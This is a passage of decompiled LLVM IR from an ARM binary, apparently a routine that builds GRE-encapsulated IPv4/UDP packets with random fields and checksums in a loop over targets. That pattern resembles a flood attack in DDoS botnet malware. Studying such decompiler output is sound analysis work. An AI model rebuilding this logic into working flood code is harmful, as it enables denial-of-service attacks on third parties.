  store i32 %v2_ab50, i32* %v7_ab5c, align 4
  %v0_ab60 = load i32, i32* %r1.global-to-local, align 4
  %v1_ab60 = load i32, i32* %r3.global-to-local, align 4
  %v4_ab60 = mul i32 %v1_ab60, 4
  %v5_ab60 = add i32 %v4_ab60, %v0_ab60
  %v6_ab60 = inttoptr i32 %v5_ab60 to i32*
  %v7_ab60 = load i32, i32* %v6_ab60, align 4
  store i32 %v7_ab60, i32* %r4.global-to-local, align 4
  %v1_ab64 = inttoptr i32 %v7_ab60 to i8*
  %v2_ab64 = load i8, i8* %v1_ab64, align 1
  %tmp = urem i8 %v2_ab64, 16
  %v1_ab68 = zext i8 %tmp to i32
  %v1_ab6c = or i32 %v1_ab68, 64
  store i32 %v1_ab6c, i32* %r2.global-to-local, align 4
  %v1_ab70 = trunc i32 %v1_ab6c to i8
  store i8 %v1_ab70, i8* %v1_ab64, align 1
  %v0_ab74 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab74 = inttoptr i32 %v0_ab74 to i8*
  %v2_ab74 = load i8, i8* %v1_ab74, align 1
  %v1_ab78 = and i8 %v2_ab74, -16
  %v1_ab7c = or i8 %v1_ab78, 5
  store i32 %v1_a930, i32* %r2.global-to-local, align 4
  store i8 %v1_ab7c, i8* %v1_ab74, align 1
  %v2_ab8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ab8c = add i32 %v2_ab8c, 1
  %v4_ab8c = inttoptr i32 %v3_ab8c to i8*
  store i8 %v5_a8e8, i8* %v4_ab8c, align 1
  store i32 %v4_ab90, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_ab98 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab98 = add i32 %v2_ab98, 8
  %v4_ab98 = inttoptr i32 %v3_ab98 to i8*
  store i8 %v5_a920, i8* %v4_ab98, align 1
  %v0_ab9c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab9c = load i32, i32* %ip.global-to-local, align 4
  %v9_ab9c = icmp eq i32 %v0_ab9c, %v1_ab9c
  store i1 %v9_ab9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aae8, i32* %r3.global-to-local, align 4
  store i32 %v4_aaa4, i32* %r2.global-to-local, align 4
  %v2_aba8 = load i32, i32* %r4.global-to-local, align 4
  %v3_aba8 = add i32 %v2_aba8, 3
  %v4_aba8 = inttoptr i32 %v3_aba8 to i8*
  store i8 %v5_aafc, i8* %v4_aba8, align 1
  %v0_abac = load i32, i32* %r2.global-to-local, align 4
  %v1_abac = trunc i32 %v0_abac to i8
  %v2_abac = load i32, i32* %r4.global-to-local, align 4
  %v3_abac = add i32 %v2_abac, 2
  %v4_abac = inttoptr i32 %v3_abac to i8*
  store i8 %v1_abac, i8* %v4_abac, align 1
  %v0_abb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abb0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_ab44
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %extract.t114 = trunc i32 %v3_ab0c to i8
  br label %bb94

bb:                                               ; preds = %dec_label_pc_ab44
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %v3_abb8 = load i32, i32* %r4.global-to-local, align 4
  %v4_abb8 = add i32 %v3_abb8, 6
  %v5_abb8 = inttoptr i32 %v4_abb8 to i8*
  store i8 64, i8* %v5_abb8, align 1
  %v0_abc0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t115 = trunc i32 %v0_abc0.pre to i8
  br label %bb94

bb94:                                             ; preds = %.thread, %bb
  %v3_ab0c.sink.off0 = phi i8 [ %extract.t114, %.thread ], [ %extract.t115, %bb ]
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_abc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abc0 = add i32 %v2_abc0, 5
  %v4_abc0 = inttoptr i32 %v3_abc0 to i8*
  store i8 %v3_ab0c.sink.off0, i8* %v4_abc0, align 1
  store i32 %v3_ab04, i32* %r1.global-to-local, align 4
  %v0_abc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abc8, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_abc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_abc8, i32* %r2.global-to-local, align 4
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_abcc = load i32, i32* %r3.global-to-local, align 4
  %v1_abcc = trunc i32 %v0_abcc to i8
  %v2_abcc = load i32, i32* %r4.global-to-local, align 4
  %v3_abcc = add i32 %v2_abcc, 9
  %v4_abcc = inttoptr i32 %v3_abcc to i8*
  store i8 %v1_abcc, i8* %v4_abcc, align 1
  %v0_abd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abd0, label %bb98, label %bb97

bb97:                                             ; preds = %bb96
  %v1_abd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_abd0 = trunc i32 %v1_abd0 to i8
  %v3_abd0 = load i32, i32* %r4.global-to-local, align 4
  %v4_abd0 = add i32 %v3_abd0, 7
  %v5_abd0 = inttoptr i32 %v4_abd0 to i8*
  store i8 %v2_abd0, i8* %v5_abd0, align 1
  br label %bb98

bb98:                                             ; preds = %bb96, %bb97
  %v3_abd4 = load i32, i32* %stack_var_-40, align 4
  %v5_abdc = mul i32 %v3_abd4, 24
  store i32 %v5_abdc, i32* %r3.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v1_abe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_abe4 = add i32 %v1_abe4, 12
  %v3_abe4 = inttoptr i32 %v2_abe4 to i32*
  store i32 %v5_a9d0, i32* %v3_abe4, align 4
  %v0_abe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abe8 = load i32, i32* @sb, align 4
  %v2_abe8 = add i32 %v1_abe8, %v0_abe8
  store i32 %v2_abe8, i32* %r3.global-to-local, align 4
  %v1_abec = add i32 %v2_abe8, 16
  %v2_abec = inttoptr i32 %v1_abec to i32*
  %v3_abec = load i32, i32* %v2_abec, align 4
  store i32 %v3_abec, i32* %r2.global-to-local, align 4
  %v0_abf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf0 = trunc i32 %v0_abf0 to i8
  %v2_abf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abf0 = add i32 %v2_abf0, 4
  %v4_abf0 = inttoptr i32 %v3_abf0 to i8*
  store i8 %v1_abf0, i8* %v4_abf0, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_abf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_abf8 = add i32 %v0_abf8, 20
  store i32 %v1_abf8, i32* %r1.global-to-local, align 4
  %v3_abfc = add i32 %v0_abf8, 22
  %v4_abfc = inttoptr i32 %v3_abfc to i8*
  store i8 101, i8* %v4_abfc, align 1
  %v0_ac00 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac00 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac00 = add i32 %v1_ac00, 16
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v0_ac00, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 24
  store i32 %v1_ac04, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_ac0c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac0c = add i32 %v0_ac0c, -93
  store i32 %v1_ac0c, i32* %r3.global-to-local, align 4
  %v2_ac10 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac10 = add i32 %v2_ac10, 3
  %v4_ac10 = inttoptr i32 %v3_ac10 to i8*
  store i8 88, i8* %v4_ac10, align 1
  %v0_ac14 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i8
  %v2_ac14 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac14 = add i32 %v2_ac14, 12
  %v4_ac14 = inttoptr i32 %v3_ac14 to i8*
  store i8 %v1_ac14, i8* %v4_ac14, align 1
  %v0_ac18 = load i32, i32* %ip.global-to-local, align 4
  %v1_ac18 = trunc i32 %v0_ac18 to i8
  %v2_ac18 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac18 = add i32 %v2_ac18, 13
  %v4_ac18 = inttoptr i32 %v3_ac18 to i8*
  store i8 %v1_ac18, i8* %v4_ac18, align 1
  %v0_ac1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac1c = add i32 %v0_ac1c, 38
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %tmp116 = urem i8 %v3_ac1c, 16
  %v1_ac20 = zext i8 %tmp116 to i32
  %v1_ac24 = or i32 %v1_ac20, 64
  store i32 %v1_ac24, i32* %r3.global-to-local, align 4
  %v1_ac28 = trunc i32 %v1_ac24 to i8
  store i8 %v1_ac28, i8* %v2_ac1c, align 1
  %v0_ac2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac2c = add i32 %v0_ac2c, 38
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v1_ac30 = and i8 %v3_ac2c, -16
  %v1_ac34 = or i8 %v1_ac30, 5
  store i8 %v1_ac34, i8* %v2_ac2c, align 1
  %v0_ac40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac40 = add i32 %v0_ac40, 38
  store i32 %v1_ac40, i32* @r5, align 4
  %v3_ac44 = add i32 %v0_ac40, 39
  %v4_ac44 = inttoptr i32 %v3_ac44 to i8*
  store i8 %v5_a8e8, i8* %v4_ac44, align 1
  store i32 %v7_ab04, i32* %r1.global-to-local, align 4
  store i32 %tmp91, i32* %r3.global-to-local, align 4
  store i32 %v3_ab10, i32* %r2.global-to-local, align 4
  %v2_ac54 = load i32, i32* @r5, align 4
  %v3_ac54 = add i32 %v2_ac54, 4
  %v4_ac54 = inttoptr i32 %v3_ac54 to i8*
  store i8 %v5_aad4, i8* %v4_ac54, align 1
  %v0_ac58 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i8
  %v2_ac58 = load i32, i32* @r5, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i8*
  store i8 %v1_ac58, i8* %v4_ac58, align 1
  %v0_ac5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac5c, label %bb100, label %bb99

bb99:                                             ; preds = %bb98
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %bb98, %bb99
  store i32 %v3_ab14, i32* %r1.global-to-local, align 4
  %v0_ac64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac64 = trunc i32 %v0_ac64 to i8
  %v2_ac64 = load i32, i32* @r5, align 4
  %v3_ac64 = add i32 %v2_ac64, 3
  %v4_ac64 = inttoptr i32 %v3_ac64 to i8*
  store i8 %v1_ac64, i8* %v4_ac64, align 1
  store i32 %v4_ab90, i32* %r2.global-to-local, align 4
  %v0_ac6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac6c, label %bb102, label %bb101

bb101:                                            ; preds = %bb100
  %v1_ac6c = load i32, i32* %r3.global-to-local, align 4
  %v2_ac6c = trunc i32 %v1_ac6c to i8
  %v3_ac6c = load i32, i32* @r5, align 4
  %v4_ac6c = add i32 %v3_ac6c, 6
  %v5_ac6c = inttoptr i32 %v4_ac6c to i8*
  store i8 %v2_ac6c, i8* %v5_ac6c, align 1
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac74 = trunc i32 %v0_ac74 to i8
  %v2_ac74 = load i32, i32* @r5, align 4
  %v3_ac74 = add i32 %v2_ac74, 5
  %v4_ac74 = inttoptr i32 %v3_ac74 to i8*
  store i8 %v1_ac74, i8* %v4_ac74, align 1
  %v0_ac78 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac78 = trunc i32 %v0_ac78 to i8
  %v2_ac78 = load i32, i32* @r5, align 4
  %v3_ac78 = add i32 %v2_ac78, 8
  %v4_ac78 = inttoptr i32 %v3_ac78 to i8*
  store i8 %v1_ac78, i8* %v4_ac78, align 1
  %v0_ac7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac7c, label %bb104, label %bb103

bb103:                                            ; preds = %bb102
  %v1_ac7c = load i32, i32* %ip.global-to-local, align 4
  %v2_ac7c = trunc i32 %v1_ac7c to i8
  %v3_ac7c = load i32, i32* @r5, align 4
  %v4_ac7c = add i32 %v3_ac7c, 7
  %v5_ac7c = inttoptr i32 %v4_ac7c to i8*
  store i8 %v2_ac7c, i8* %v5_ac7c, align 1
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_ac80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac80 = trunc i32 %v0_ac80 to i8
  %v2_ac80 = load i32, i32* @r5, align 4
  %v3_ac80 = add i32 %v2_ac80, 9
  %v4_ac80 = inttoptr i32 %v3_ac80 to i8*
  store i8 %v1_ac80, i8* %v4_ac80, align 1
  %v0_ac84 = call i32 @function_fe24()
  store i32 %v0_ac84, i32* %r0.global-to-local, align 4
  store i32 %v1_aa2c, i32* %r1.global-to-local, align 4
  store i1 %v2_ac90, i1* %cpsr_z.global-to-local, align 1
  %v1_ac94 = sub i32 1023, %v0_ac84
  store i32 %v1_ac94, i32* %r3.global-to-local, align 4
  br i1 %v2_ac90, label %.thread21, label %.thread22

.thread21:                                        ; preds = %bb104
  %v2_ac9c = load i32, i32* @r5, align 4
  %v3_ac9c = add i32 %v2_ac9c, 16
  %v4_ac9c = inttoptr i32 %v3_ac9c to i32*
  store i32 %v1_ac94, i32* %v4_ac9c, align 4
  br label %bb105

.thread22:                                        ; preds = %bb104
  %v1_ac98 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac98 = add i32 %v1_ac98, 16
  %v3_ac98 = inttoptr i32 %v2_ac98 to i32*
  %v4_ac98 = load i32, i32* %v3_ac98, align 4
  store i32 %v4_ac98, i32* %r3.global-to-local, align 4
  %v2_aca0 = load i32, i32* @r5, align 4
  %v3_aca0 = add i32 %v2_aca0, 16
  %v4_aca0 = inttoptr i32 %v3_aca0 to i32*
  store i32 %v4_ac98, i32* %v4_aca0, align 4
  br label %bb105

bb105:                                            ; preds = %.thread21, %.thread22
  store i32 %v4_aca4, i32* %r3.global-to-local, align 4
  %v0_aca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aca8 = add i32 %v0_aca8, 58
  store i32 %v1_aca8, i32* @r6, align 4
  %v1_acac = load i32, i32* @r5, align 4
  %v2_acac = add i32 %v1_acac, 12
  %v3_acac = inttoptr i32 %v2_acac to i32*
  store i32 %v0_ac84, i32* %v3_acac, align 4
  %v0_acb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_acb0 = trunc i32 %v0_acb0 to i8
  %v2_acb0 = load i32, i32* @r6, align 4
  %v3_acb0 = add i32 %v2_acb0, 1
  %v4_acb0 = inttoptr i32 %v3_acb0 to i8*
  store i8 %v1_acb0, i8* %v4_acb0, align 1
  %v3_acb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_acb4, i32* %r3.global-to-local, align 4
  store i32 %v4_acb8, i32* %r2.global-to-local, align 4
  %v1_acbc = add i32 %v3_acb4, 1
  store i32 %v1_acbc, i32* @r4, align 4
  store i32 %v4_acc0, i32* %r1.global-to-local, align 4
  %v1_acc4 = load i32, i32* @fp, align 4
  %v9_acc4 = icmp eq i32 %v1_acbc, %v1_acc4
  store i1 %v9_acc4, i1* %cpsr_z.global-to-local, align 1
  %v2_acc8 = load i32, i32* @r6, align 4
  %v3_acc8 = add i32 %v2_acc8, 5
  %v4_acc8 = inttoptr i32 %v3_acc8 to i8*
  store i8 %v1_acc8, i8* %v4_acc8, align 1
  %v0_accc = load i32, i32* @r7, align 4
  %v1_accc = trunc i32 %v0_accc to i8
  %v2_accc = load i32, i32* @r6, align 4
  %v3_accc = inttoptr i32 %v2_accc to i8*
  store i8 %v1_accc, i8* %v3_accc, align 1
  %v0_acd0 = load i32, i32* %sl.global-to-local, align 4
  %v1_acd0 = trunc i32 %v0_acd0 to i8
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 2
  %v4_acd0 = inttoptr i32 %v3_acd0 to i8*
  store i8 %v1_acd0, i8* %v4_acd0, align 1
  %v0_acd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acd4 = trunc i32 %v0_acd4 to i8
  %v2_acd4 = load i32, i32* @r6, align 4
  %v3_acd4 = add i32 %v2_acd4, 3
  %v4_acd4 = inttoptr i32 %v3_acd4 to i8*
  store i8 %v1_acd4, i8* %v4_acd4, align 1
  %v0_acd8 = load i32, i32* %r8.global-to-local, align 4
  %v1_acd8 = trunc i32 %v0_acd8 to i8
  %v2_acd8 = load i32, i32* @r6, align 4
  %v3_acd8 = add i32 %v2_acd8, 4
  %v4_acd8 = inttoptr i32 %v3_acd8 to i8*
  store i8 %v1_acd8, i8* %v4_acd8, align 1
  %v0_acdc = load i32, i32* @r4, align 4
  store i32 %v0_acdc, i32* %stack_var_-40, align 4
  %v5_ace0 = icmp slt i32 %v1_acbc, %v1_acc4
  br i1 %v5_ace0, label %dec_label_pc_ab44, label %dec_label_pc_ace4

dec_label_pc_ace4:                                ; preds = %bb105
  %v1_acec = add i32 %v5_a97c, 8
  store i32 %v1_acec, i32* %r2.global-to-local, align 4
  %v1_acf0 = add i32 %v5_a97c, 66
  store i32 %v1_acf0, i32* %r3.global-to-local, align 4
  %v0_acfc.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_acfc.preheader

dec_label_pc_acfc.preheader:                      ; preds = %dec_label_pc_ace4, %dec_label_pc_afec
  %v0_acfc.pre = phi i32 [ %v0_acfc.pre.pre, %dec_label_pc_ace4 ], [ %v0_aa40, %dec_label_pc_afec ]
  %stack_var_-160.0.ph = phi i32 [ %v1_acf0, %dec_label_pc_ace4 ], [ %v1_aff8, %dec_label_pc_afec ]
  %stack_var_-156.0.ph = phi i32 [ %v1_acec, %dec_label_pc_ace4 ], [ %v1_aff4, %dec_label_pc_afec ]
  %v9_af4c = icmp eq i32 %v3_aa34, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_afbc = icmp eq i32 %v1_aa2c, 0
  %v2_ada0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_adb8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_adc8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_add4 = ptrtoint i32* %stack_var_-50 to i32
  %v2_ade8 = icmp eq i32 %v1_a99c, 0
  %v2_ad44 = icmp eq i32 %v5_a9d0, -1
  %v7_ad44 = icmp eq i32 %v5_a9d0, -1
  br label %dec_label_pc_acfc

dec_label_pc_acfc:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_acfc.preheader
  %v0_acfc = phi i32 [ %v0_acfc.pre, %dec_label_pc_acfc.preheader ], [ %v1_aeb4, %dec_label_pc_adf0 ]
  %v2_acfc = icmp eq i32 %v0_acfc, 0
  store i1 %v2_acfc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp106 = icmp slt i32 %v0_acfc, 1
  br label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ad04, %dec_label_pc_acfc
  br i1 %tmp106, label %dec_label_pc_ad04, label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_ad04
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_ad14

dec_label_pc_ad14:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_ad08
  %v1_ad28 = phi i32 [ %v1_aeb0, %dec_label_pc_adf0 ], [ 0, %dec_label_pc_ad08 ]
  %v5_ad18 = mul i32 %v1_ad28, 24
  %v1_ad1c = load i32, i32* @sb, align 4
  %v2_ad1c = add i32 %v1_ad1c, %v5_ad18
  store i32 %v2_ad1c, i32* %r3.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v1_ad24 = add i32 %v2_ad1c, 20
  %v2_ad24 = inttoptr i32 %v1_ad24 to i8*
  %v3_ad24 = load i8, i8* %v2_ad24, align 1
  %v4_ad24 = zext i8 %v3_ad24 to i32
  store i32 %v4_ad24, i32* %r2.global-to-local, align 4
  %v4_ad28 = mul i32 %v1_ad28, 4
  %v5_ad28 = add i32 %v4_ad28, %v2_a8b0
  %v6_ad28 = inttoptr i32 %v5_ad28 to i32*
  %v7_ad28 = load i32, i32* %v6_ad28, align 4
  store i32 %v7_ad28, i32* @r5, align 4
  %v7_ad2c = icmp eq i8 %v3_ad24, 31
  store i1 %v7_ad2c, i1* %cpsr_z.global-to-local, align 1
  %v1_ad30 = add i32 %v7_ad28, 24
  store i32 %v1_ad30, i32* @r8, align 4
  %v1_ad34 = add i32 %v7_ad28, 38
  store i32 %v1_ad34, i32* @r6, align 4
  %v1_ad38 = add i32 %v7_ad28, 58
  store i32 %v1_ad38, i32* @r7, align 4
  %tmp117 = icmp ult i8 %v3_ad24, 32
  br i1 %tmp117, label %dec_label_pc_aed4, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad14
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_af4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af4c, label %dec_label_pc_af58, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge, %dec_label_pc_ad4c
  %v1_ad64 = phi i32 [ %v1_ad64.pre, %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_ad4c ]
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v9_ad64 = icmp eq i32 %v3_aa38, %v1_ad64
  store i1 %v9_ad64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad64, label %dec_label_pc_af90, label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge, %dec_label_pc_ad60
  %v1_ad70 = phi i32 [ %v1_ad70.pre, %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge ], [ %v1_ad64, %dec_label_pc_ad60 ]
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v9_ad70 = icmp eq i32 %v3_aa3c, %v1_ad70
  store i1 %v9_ad70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad70, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_ad78:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %dec_label_pc_afd0, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_ad78
  %v1_ad80 = load i32, i32* @r5, align 4
  %v2_ad80 = add i32 %v1_ad80, 16
  %v3_ad80 = inttoptr i32 %v2_ad80 to i32*
  %v4_ad80 = load i32, i32* %v3_ad80, align 4
  store i32 %v4_ad80, i32* %r3.global-to-local, align 4
  %v2_ad84 = load i32, i32* @r6, align 4
  %v3_ad84 = add i32 %v2_ad84, 16
  %v4_ad84 = inttoptr i32 %v3_ad84 to i32*
  store i32 %v4_ad80, i32* %v4_ad84, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb109, %.thread23, %dec_label_pc_afd0
  %v0_ad8c = call i32 @function_fe24()
  store i32 %v0_ad8c, i32* %r0.global-to-local, align 4
  store i32 %v0_ad8c, i32* %stack_var_-44, align 4
  %v0_ad94 = call i32 @function_fe24()
  store i32 %v0_ad94, i32* %r0.global-to-local, align 4
  store i32 %v0_ad94, i32* %stack_var_-48, align 4
  %v0_ad9c = call i32 @function_fe24()
  store i32 %v2_ada0, i32* %r1.global-to-local, align 4
  store i32 %v0_ad9c, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_adac = load i32, i32* @r8, align 4
  store i32 %v0_adac, i32* %r0.global-to-local, align 4
  %v3_adb0 = call i32 @function_12558(i32 %v0_adac, i32 %v2_ada0, i32 4)
  %v0_adb4 = load i32, i32* @r8, align 4
  %v1_adb4 = add i32 %v0_adb4, 6
  store i32 %v1_adb4, i32* %r0.global-to-local, align 4
  store i32 %v2_adb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_adc0 = call i32 @function_12558(i32 %v1_adb4, i32 %v2_adb8, i32 4)
  %v0_adc4 = load i32, i32* @r8, align 4
  %v1_adc4 = add i32 %v0_adc4, 4
  store i32 %v1_adc4, i32* %r0.global-to-local, align 4
  store i32 %v2_adc8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_add0 = call i32 @function_12558(i32 %v1_adc4, i32 %v2_adc8, i32 2)
  store i32 %v2_add4, i32* %r1.global-to-local, align 4
  %v0_add8 = load i32, i32* @r8, align 4
  %v1_add8 = add i32 %v0_add8, 10
  store i32 %v1_add8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ade0 = call i32 @function_12558(i32 %v1_add8, i32 %v2_add4, i32 2)
  store i32 %v3_ade0, i32* %r0.global-to-local, align 4
  store i32 %v1_a99c, i32* %r1.global-to-local, align 4
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ade8, label %dec_label_pc_adf0, label %dec_label_pc_afdc

dec_label_pc_adf0:                                ; preds = %dec_label_pc_ad8c, %dec_label_pc_afdc
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adf4 = load i32, i32* @sl, align 4
  %v1_adf4 = trunc i32 %v0_adf4 to i8
  %v2_adf4 = load i32, i32* @r5, align 4
  %v3_adf4 = add i32 %v2_adf4, 10
  %v4_adf4 = inttoptr i32 %v3_adf4 to i8*
  store i8 %v1_adf4, i8* %v4_adf4, align 1
  %v0_adf8 = load i32, i32* @sl, align 4
  %v1_adf8 = trunc i32 %v0_adf8 to i8
  %v2_adf8 = load i32, i32* @r5, align 4
  %v3_adf8 = add i32 %v2_adf8, 11
  %v4_adf8 = inttoptr i32 %v3_adf8 to i8*
  store i8 %v1_adf8, i8* %v4_adf8, align 1
  %v0_adfc = load i32, i32* @r5, align 4
  store i32 %v0_adfc, i32* @r0, align 4
  %v2_ae00 = call i32 @function_e424(i32 %v0_adfc, i32 20)
  %v3_ae00 = trunc i32 %v2_ae00 to i8
  %v4_ae04 = sdiv i32 %v2_ae00, 256
  store i32 %v4_ae04, i32* %r3.global-to-local, align 4
  %v1_ae08 = trunc i32 %v4_ae04 to i8
  %v2_ae08 = load i32, i32* @r5, align 4
  %v3_ae08 = add i32 %v2_ae08, 11
  %v4_ae08 = inttoptr i32 %v3_ae08 to i8*
  store i8 %v1_ae08, i8* %v4_ae08, align 1
  %v3_ae0c = load i32, i32* @r5, align 4
  %v4_ae0c = add i32 %v3_ae0c, 10
  %v5_ae0c = inttoptr i32 %v4_ae0c to i8*
  store i8 %v3_ae00, i8* %v5_ae0c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v1_ae14 = trunc i32 %v0_ae14 to i8
  %v2_ae14 = load i32, i32* @r6, align 4
  %v3_ae14 = add i32 %v2_ae14, 10
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  %v0_ae18 = load i32, i32* @sl, align 4
  %v1_ae18 = trunc i32 %v0_ae18 to i8
  %v2_ae18 = load i32, i32* @r6, align 4
  %v3_ae18 = add i32 %v2_ae18, 11
  %v4_ae18 = inttoptr i32 %v3_ae18 to i8*
  store i8 %v1_ae18, i8* %v4_ae18, align 1
  %v0_ae1c = load i32, i32* @r6, align 4
  store i32 %v0_ae1c, i32* @r0, align 4
  %v2_ae20 = call i32 @function_e424(i32 %v0_ae1c, i32 20)
  %v3_ae20 = trunc i32 %v2_ae20 to i8
  store i32 %v2_ae20, i32* %r0.global-to-local, align 4
  %v4_ae24 = sdiv i32 %v2_ae20, 256
  store i32 %v4_ae24, i32* %r3.global-to-local, align 4
  %v3_ae28 = load i32, i32* @r6, align 4
  %v4_ae28 = add i32 %v3_ae28, 10
  %v5_ae28 = inttoptr i32 %v4_ae28 to i8*
  store i8 %v3_ae20, i8* %v5_ae28, align 1
  %v0_ae2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae2c = trunc i32 %v0_ae2c to i8
  %v2_ae2c = load i32, i32* @r6, align 4
  %v3_ae2c = add i32 %v2_ae2c, 11
  %v4_ae2c = inttoptr i32 %v3_ae2c to i8*
